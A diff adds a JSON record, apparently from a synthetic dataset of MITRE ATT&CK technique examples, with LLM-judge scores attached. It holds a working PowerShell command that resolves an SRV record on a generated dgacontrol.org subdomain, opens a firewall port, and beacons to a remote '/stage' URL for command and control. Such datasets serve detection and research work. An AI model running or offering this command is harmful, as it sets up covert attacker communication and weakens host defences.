@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('svc{0}.dgacontrol.org' -f (Get-Random -Min 1000 -Max 9999)); $srv=Resolve-DnsName ('_c2._tcp.{0}' -f $dom) -Type SRV -Server '1.1.1.1' -ErrorAction SilentlyContinue; if($srv){ $target=$srv[0].NameTarget.TrimEnd('.'); $port=$srv[0].Port; netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('https://{0}:{1}/stage' -f $target,$port) -Headers @{ Host=$dom } -TimeoutSec 7 -UseBasicParsing } }",
+  "explanation": "Leverages SRV records for dynamic target and port discovery, then opens the discovered port and initiates HTTPS communication using the resolved service target.",
+  "rationale_steps": [
+    "Generate a DGA-derived base domain.",
+    "Query SRV to obtain the authoritative host and port for C2.",
+    "Allow outbound traffic to the dynamically advertised port.",
+    "Beacon to the service target with the original Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-62ede724",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper PowerShell syntax for string formatting, error handling, and conditional execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Dynamic Resolution technique by generating a random domain name, resolving SRV records to dynamically discover C2 endpoints and ports, creating a firewall rule for the discovered port, and establishing HTTPS communication with the resolved target.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:46:14.853543Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, parentheses, and braces, and valid parameters for all cmdlets and external commands.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements dynamic resolution for C2 via SRV records and attempts beaconing, but the `netsh` firewall rule modification requires elevated privileges, contradicting the stated 'Privilege: None' for full operational success.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:46:34.051649Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell scriptblock is well-formed with balanced delimiters, valid cmdlets/parameters, correctly evaluated expressions, and properly separated statements.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a subdomain and resolves an SRV record to obtain a dynamic host and port before attempting HTTPS with a Host header\u2014matching T1568\u2014though creating the firewall rule likely requires admin rights and TLS/SNI or certificate validation may impede the connection.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:47:12.398553Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
